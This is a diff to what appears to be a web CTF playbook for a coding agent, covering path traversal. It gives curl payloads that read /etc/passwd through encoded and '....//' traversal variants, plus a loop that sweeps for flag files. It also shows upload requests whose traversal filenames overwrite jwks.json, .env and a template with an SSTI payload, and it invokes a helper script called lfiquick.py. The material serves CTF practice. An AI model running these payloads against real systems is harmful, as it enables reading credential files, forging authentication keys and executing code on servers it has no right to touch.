@@ -2,6 +2,22 @@
 
 ## E. Read traversal — filename or path params
 
+Start from a URL that already returns a real file. `lfiquick.py` preserves that baseline and all
+other query fields, calibrates a same-directory missing-file control, tests a bounded traversal
+matrix, and scans response headers as well as bodies. If auth is supplied, it checks the baseline
+and winning read anonymously too. A confirmed `/etc/passwd` read causes the exact winning style
+and depth to be reused for the flag sweep; differentials without a file signature remain
+inconclusive and are retained under `--out` for inspection.
+
+```bash
+python3 ~/.codex/skills/web-ctf/scripts/lfiquick.py \
+  --url "<target>/api/file?name=/uploads/known.txt" --param name \
+  --token "$TOKEN" --out recon/lfiquick
+```
+
+Use the manual probes below only when the endpoint cannot be represented as one GET query field,
+or to investigate evidence retained by the bounded helper.
+
 ```bash
 curl -si "<target>/api/file?name=../../../etc/passwd" $AUTH_HEADER              # standard
 curl -si "<target>/api/file?name=....//....//....//etc/passwd" $AUTH_HEADER     # four-dot double-slash
@@ -12,10 +28,12 @@ curl -si "<target>/api/file?name=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd" $AUTH_
 
 **The `....//` bypass specifically:** Node treats `....` as a literal directory name, so combined with `//` the resolved path reaches a different location than the regex checked. It also defeats suffix-appending suppressors (`.txt`).
 
-Once traversal works:
+Once traversal works, keep the same prefix, encoding, and depth that won. Do not switch wrappers
+for the flag sweep:
 ```bash
+WIN='../../../'  # replace with the exact confirmed prefix
 for f in '/flag.txt' '/flag' '/root/flag.txt' '/home/user/flag.txt' '/app/flag.txt' '/data/flag.txt' '/var/flag.txt'; do
-  echo "=== $f ==="; curl -si "<target>/api/file?name=....//....//..../$f" $AUTH_HEADER
+  echo "=== $f ==="; curl -si "<target>/api/file?name=${WIN}${f#/}" $AUTH_HEADER
 done
 ```
 
@@ -37,7 +55,7 @@ curl -s <target>/.well-known/jwks.json && echo "JWKS at root"
 #   /app/uploads/ -> /app/static/.well-known/jwks.json  = ../static/.well-known/jwks.json
 #   /app/uploads/ -> /static/.well-known/jwks.json      = ../../static/.well-known/jwks.json
 curl -si -X POST <target>/api/upload $AUTH_HEADER \
-  -F "file=@~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/jwks.json;filename=../static/.well-known/jwks.json"
+  -F "file=@${HOME}/Offsec/Web_CTF/CTF/<challenge-name>/exploits/jwks.json;filename=../static/.well-known/jwks.json"
 
 curl -s <target>/static/.well-known/jwks.json | python3 -m json.tool   # verify
 ```
@@ -46,11 +64,11 @@ Other high-value overwrite targets:
 ```bash
 # .env — DB creds / secrets read at runtime
 curl -si -X POST <target>/api/upload $AUTH_HEADER \
-  -F "file=@~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/evil.env;filename=../.env"
+  -F "file=@${HOME}/Offsec/Web_CTF/CTF/<challenge-name>/exploits/evil.env;filename=../.env"
 
 # server-side template — overwrite with an SSTI payload
 curl -si -X POST <target>/api/upload $AUTH_HEADER \
-  -F "file=@~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/evil.html;filename=../templates/index.html"
+  -F "file=@${HOME}/Offsec/Web_CTF/CTF/<challenge-name>/exploits/evil.html;filename=../templates/index.html"
 ```
 
 JWKS overwrite lands → go to `auth-jwt.md` § JWKS substitution.
